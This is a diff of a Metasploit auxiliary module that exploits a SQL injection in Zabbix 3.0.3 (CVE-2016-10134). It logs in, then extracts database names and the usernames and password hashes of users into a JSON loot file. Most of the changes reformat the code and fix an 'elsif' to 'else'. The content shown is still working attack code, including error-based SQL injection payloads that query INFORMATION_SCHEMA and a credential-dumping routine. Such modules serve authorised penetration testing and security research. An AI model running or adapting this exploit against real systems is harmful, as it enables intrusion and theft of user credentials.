@@ -8,26 +8,32 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::HttpClient
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name'           => 'Zabbix toggle_ids SQL Injection',
-      'Description'    => %q{
-      This module will exploit a SQL injection in Zabbix 3.0.3 and
-      likely prior in order to save the current usernames and
-      password hashes from the database to a JSON file.
-      },
-      'References'     =>
-        [
+    super(
+      update_info(
+        info,
+        'Name' => 'Zabbix toggle_ids SQL Injection',
+        'Description' => %q{
+          This module will exploit a SQL injection in Zabbix 3.0.3 and
+          likely prior in order to save the current usernames and
+          password hashes from the database to a JSON file.
+        },
+        'References' => [
           ['CVE', '2016-10134'],
           ['URL', 'https://seclists.org/fulldisclosure/2016/Aug/60']
         ],
-      'Author'         =>
-        [
-          '1n3@hushmail.com', #discovery
-          'bperry' #module
+        'Author' => [
+          '1n3@hushmail.com', # discovery
+          'bperry' # module
         ],
-      'License'        => MSF_LICENSE,
-      'DisclosureDate' => '2016-08-11'
-    ))
+        'License' => MSF_LICENSE,
+        'DisclosureDate' => '2016-08-11',
+        'Notes' => {
+          'Reliability' => UNKNOWN_RELIABILITY,
+          'Stability' => UNKNOWN_STABILITY,
+          'SideEffects' => UNKNOWN_SIDE_EFFECTS
+        }
+      )
+    )
 
     register_options(
       [
@@ -35,11 +41,11 @@ class MetasploitModule < Msf::Auxiliary
         OptString.new('USERNAME', [false, 'The username to authenticate with', 'Admin']),
         OptString.new('PASSWORD', [false, 'The password to authenticate with', 'zabbix']),
         OptString.new('TARGETURI', [true, 'The relative URI for Zabbix', '/zabbix'])
-      ])
+      ]
+    )
   end
 
   def check
-
     sid, cookies = authenticate
 
     left_marker = Rex::Text.rand_text_alpha(5)
@@ -96,8 +102,7 @@ class MetasploitModule < Msf::Auxiliary
     count = match[1].to_i
 
     dbs = []
-    0.upto(count-1) do |cur|
-
+    0.upto(count - 1) do |cur|
       get_dbs = " AND (SELECT 5184 FROM(SELECT COUNT(*),CONCAT(0x#{left_marker.unpack("H*")[0]}"
       get_dbs << ",(SELECT MID((IFNULL(CAST(schema_name AS CHAR),0x20)),1,54)"
       get_dbs << " FROM INFORMATION_SCHEMA.SCHEMATA LIMIT #{cur},1),0x#{right_marker.unpack("H*")[0]},"
@@ -145,7 +150,7 @@ class MetasploitModule < Msf::Auxiliary
 
       count = match[1].to_i
 
-      0.upto(count-1) do |cur|
+      0.upto(count - 1) do |cur|
         user = {}
         cols.each do |col|
           get_col = " AND (SELECT 6334 FROM(SELECT COUNT(*),CONCAT(0x#{left_marker.unpack("H*")[0]}"
@@ -171,80 +176,79 @@ class MetasploitModule < Msf::Auxiliary
       end
     end
 
-    loot = store_loot("zabbixusers.json","text/plain", rhost, users.to_json)
+    loot = store_loot("zabbixusers.json", "text/plain", rhost, users.to_json)
 
     print_good('Users and password hashes stored at ' + loot)
-
   end
 
   def authenticate
-   res = send_request_cgi({
-     'uri' => normalize_uri(target_uri.path, 'index.php')
-   })
+    res = send_request_cgi({
+      'uri' => normalize_uri(target_uri.path, 'index.php')
+    })
 
-   unless res and res.body
-     fail_with(Failure::Unknown, 'Server did not respond in an expected way')
-   end
+    unless res and res.body
+      fail_with(Failure::Unknown, 'Server did not respond in an expected way')
+    end
 
-   cookies = res.get_cookies
+    cookies = res.get_cookies
 
-   match = /name="sid" value="(.*?)">/.match(res.body)
+    match = /name="sid" value="(.*?)">/.match(res.body)
 
-   unless match
-     fail_with(Failure::Unknown, 'Server did not respond in an expected way')
-   end
+    unless match
+      fail_with(Failure::Unknown, 'Server did not respond in an expected way')
+    end
 
-   sid = match[1]
+    sid = match[1]
 
-   if datastore['REQUIREAUTH']
+    if datastore['REQUIREAUTH']
 
-     res = send_request_cgi({
-       'uri' => normalize_uri(target_uri.path, 'index.php'),
-       'method' => 'POST',
-       'vars_post' => {
-         'sid' => sid,
-         'form_refresh' => 1,
-         'name' => datastore['USERNAME'],
-         'password' => datastore['PASSWORD'],
-         'autologin' => 1,
-         'enter' => 'Sign in'
-       },
-       'cookie' => cookies
-     })
+      res = send_request_cgi({
+        'uri' => normalize_uri(target_uri.path, 'index.php'),
+        'method' => 'POST',
+        'vars_post' => {
+          'sid' => sid,
+          'form_refresh' => 1,
+          'name' => datastore['USERNAME'],
+          'password' => datastore['PASSWORD'],
+          'autologin' => 1,
+          'enter' => 'Sign in'
+        },
+        'cookie' => cookies
+      })
 
-     unless res
-       fail_with(Failure::Unknown, 'Server did not respond in an expected way')
-     end
+      unless res
+        fail_with(Failure::Unknown, 'Server did not respond in an expected way')
+      end
 
-     if res.code == 302
-       cookies = res.get_cookies
+      if res.code == 302
+        cookies = res.get_cookies
 
-       res = send_request_cgi({
-         'uri' => normalize_uri(target_uri.path, 'latest.php'),
-         'vars_get' => {
-          'ddreset' => '1'
-         },
-         'cookies' => cookies
-       })
+        res = send_request_cgi({
+          'uri' => normalize_uri(target_uri.path, 'latest.php'),
+          'vars_get' => {
+            'ddreset' => '1'
+          },
+          'cookies' => cookies
+        })
 
-       unless res and res.body
-         fail_with(Failure::Unknown, 'Server did not respond in an expected way')
-       end
+        unless res and res.body
+          fail_with(Failure::Unknown, 'Server did not respond in an expected way')
+        end
 
-       cookies = res.get_cookies
-       match = /name="sid" value="(.*?)">/.match(res.body)
+        cookies = res.get_cookies
+        match = /name="sid" value="(.*?)">/.match(res.body)
 
-       unless match
-         fail_with(Failure::Unknown, 'Server did not respond in an expected way')
-       end
+        unless match
+          fail_with(Failure::Unknown, 'Server did not respond in an expected way')
+        end
 
-       sid = match[1]
-     elsif
-       fail_with(Failure::Unknown, 'Server did not respond in an expected way')
-     end
-   end
+        sid = match[1]
+      else
+        fail_with(Failure::Unknown, 'Server did not respond in an expected way')
+      end
+    end
 
-   return sid, cookies
+    return sid, cookies
   end
 
   def make_injected_request(sql, sid, cookies)
